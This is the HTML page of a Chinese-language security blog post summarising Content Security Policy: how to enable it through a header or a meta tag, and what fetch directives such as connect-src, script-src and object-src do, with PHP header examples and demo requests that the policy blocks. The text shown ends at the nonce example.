@@ -1,0 +1,2728 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sariel.D">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sariel.D">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。 CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP 小结">
+<meta property="og:url" content="https://blog.sari3l.com/posts/66ad34dc/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。 CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="article:published_time" content="2019-08-23T15:44:41.000Z">
+<meta property="article:modified_time" content="2020-07-06T09:44:56.327Z">
+<meta property="article:author" content="Sariel.D">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="Learning Man&#39;s Blog" type="application/atom+xml">
+    
+    <title>CSP 小结 · Learning Man</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/css/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/scripts/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-129685149-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-funky.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Learning Man&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CSP 小结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Learning Man's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            CSP 小结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.8k</span>阅读时长: <span class="post-count reading-time">21 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/08/23</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <!--<img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        -->
+        <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>解析器：</p>
+<ul>
+<li><a href="https://cspvalidator.org/#url=https://cspvalidator.org/" target="_blank" rel="noopener">https://cspvalidator.org/#url=https://cspvalidator.org/</a></li>
+<li>推荐：<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></li>
+</ul>
+<h2 id="启用-CSP-方式"><a href="#启用-CSP-方式" class="headerlink" title="启用 CSP 方式"></a>启用 CSP 方式</h2><ul>
+<li><p>HTTP Header Content-Security-Policy</p>
+<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Security-Policy:</span> script-src 'self'; object-src 'none';
+style-src cdn.example.org third-party.org; child-src https:</code></pre>
+</li>
+<li><p>HTML &#60;meta&gt;</p>
+</li>
+</ul>
+<p>此方式不能用于 frame-ancestors、report-uri 或 sandbox</p>
+<pre class=" language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script-src <span class="token punctuation">'</span>self<span class="token punctuation">'</span>; object-src <span class="token punctuation">'</span>none<span class="token punctuation">'</span>; style-src cdn.example.org third-party.org; child-src https:<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_cnvoid" target="_blank" rel="noopener">语法</a></h2><pre><code>Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt;</code></pre><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><h3 id="获取指令-Fetch-directives"><a href="#获取指令-Fetch-directives" class="headerlink" title="获取指令 Fetch directives"></a>获取指令 Fetch directives</h3><p>通过获取指令来控制某些可能被加载的确切的资源类型的位置</p>
+<h4 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h4><p>定义了 web workers 以及嵌套的浏览上下文（如 <code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> ）的源。推荐使用该指令，而不是被废弃的 <code>frame-src</code> 指令</p>
+<p>注意: 如果没有指定这条指令，浏览器会查询 <code>default-src</code> 指令</p>
+<blockquote>
+<p>如果开发者希望管控内嵌浏览器内容和工作者应分别使用frame-src和worker-src 指令，来相对的取代 child-src</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: frame-src example.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">// 以下Demo会被拦截</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://non-example.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre>
+<h4 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h4><p>限制能通过脚本接口加载的 URL</p>
+<p>收到影响的 API 如下：</p>
+<ul>
+<li>&#60;a&gt; ping</li>
+<li>Fetch</li>
+<li>XMLHttpRequest</li>
+<li>WebSocket</li>
+<li>EventSource</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> connect<span class="token operator">-</span>src https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/");?></span>
+<span class="token comment" spellcheck="true">// 以下Demo会被拦截</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">ping</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://not-example.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
+  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> 'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//not-example.com/'); </span>
+  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>"https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//not-example.com/");</span>
+
+  <span class="token keyword">var</span> es <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventSource</span><span class="token punctuation">(</span>"https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//not-example.com/"); </span>
+
+  navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span>"https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//not-example.com/", { ... });</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
+<h4 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h4><p>dafault-src 作为以下<code>获取指令</code>的fallback，对于以下列出的指令，假如设定了，那么 default-src 不会对它们起作用；假如不存在的话，那么用户代理会查找并应用 default-src 指令的值。</p>
+<ul>
+<li>child-src</li>
+<li>connect-src</li>
+<li>font-src</li>
+<li>frame-src</li>
+<li>img-src</li>
+<li>manifest-src</li>
+<li>media-src</li>
+<li>object-src</li>
+<li>script-src</li>
+<li>style-src</li>
+<li>worker-src</li>
+</ul>
+<p>以下指令不使用 default-src 作为 fallback。请记住，如果不对其进行设置，则等同于允许加载任何内容:</p>
+<ul>
+<li>base-uri</li>
+<li>form-action</li>
+<li>frame-ancestors</li>
+<li>plugin-types</li>
+<li>report-uri</li>
+<li>sandbox</li>
+</ul>
+<h4 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h4><p>设置允许通过@font-face加载的字体源地址。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> font<span class="token operator">-</span>src https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/");?></span>
+<span class="token comment" spellcheck="true">// 以下Demo会被拦截</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>
+  @font<span class="token operator">-</span>face <span class="token punctuation">{</span> 
+    font<span class="token operator">-</span>family<span class="token punctuation">:</span> <span class="token string">"MyFont"</span><span class="token punctuation">;</span> 
+    src<span class="token punctuation">:</span> <span class="token function">url</span><span class="token punctuation">(</span>"https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//not-example.com/font"); </span>
+  <span class="token punctuation">}</span> 
+  body <span class="token punctuation">{</span> 
+    font<span class="token operator">-</span>family<span class="token punctuation">:</span> <span class="token string">"MyFont"</span><span class="token punctuation">;</span> 
+  <span class="token punctuation">}</span> 
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span></code></pre>
+<h4 id="frame-src"><a href="#frame-src" class="headerlink" title="frame-src"></a>frame-src</h4><p>设置允许通过类似&#60;frame&gt;和&#60;iframe&gt;标签加载的内嵌内容的源地址</p>
+<p>样例类似 connect-src</p>
+<h4 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h4><p>限制图片和图标的源地址</p>
+<h4 id="manifest-src"><a href="#manifest-src" class="headerlink" title="manifest-src"></a>manifest-src</h4><p>限制应用声明文件的源地址</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> manifest<span class="token operator">-</span>src https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/");?></span>
+<span class="token comment" spellcheck="true">// 以下Demo会被拦截</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>manifest<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://not-example.com/manifest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre>
+<h4 id="media-src"><a href="#media-src" class="headerlink" title="media-src"></a>media-src</h4><p>限制通过&#60;audio&gt;、&#60;video&gt;或&#60;track&gt;标签加载的媒体文件的源地址</p>
+<h4 id="object-src"><a href="#object-src" class="headerlink" title="object-src"></a>object-src</h4><p>限制&#60;object&gt;、&#60;embed&gt;、&#60;applet&gt;标签的源地址</p>
+<blockquote>
+<p>被object-src控制的元素可能碰巧被当作遗留HTML元素，导致不支持新标准中的功能（例如&#60;iframe&gt;中的安全属性sandbox和allow）。因此建议限制该指令的使用（比如，如果可行，将object-src显式设置为’none’）</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> object<span class="token operator">-</span>src https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/");?></span>
+<span class="token comment" spellcheck="true">// 以下Demo会被拦截</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://not-example.com/flash<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>embed</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://not-example.com/plugin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span></span> 
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>applet</span> <span class="token attr-name">archive</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://not-example.com/java<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>applet</span><span class="token punctuation">></span></span></span></code></pre>
+<h4 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h4><p>限制JavaScript的源地址</p>
+<p>不仅包括直接加载到&#60;script&gt;元素中的 URL，还包括可以触发脚本执行的内联脚本处理程序(onclick)和<a href="https://developer.mozilla.org/en-US/docs/Web/XSLT" target="_blank" rel="noopener">XSLT样式表</a>等内容</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> script<span class="token operator">-</span>src https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/");?></span>
+<span class="token comment" spellcheck="true">// 以下Demo会被拦截</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://not-example.com/js/library.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>doSomething()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+<span class="token comment" spellcheck="true">// 以下Demo会被放行</span>
+document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"btn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> doSomething<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h5 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h5><p>要允许内联脚本和内联事件处理程序，<code>unsafe-inline</code>可以指定与内联块匹配的<code>nonce-source</code>或<code>hash-source</code></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: script-src 'unsafe-inline';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">//允许内联</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>元素
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span> 
+  <span class="token keyword">var</span> inline <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> 
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
+<ul>
+<li>nonce</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: script-src 'nonce-2726c7f26c'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">// 允许特定内联脚本块，需设置相同随机数</span>
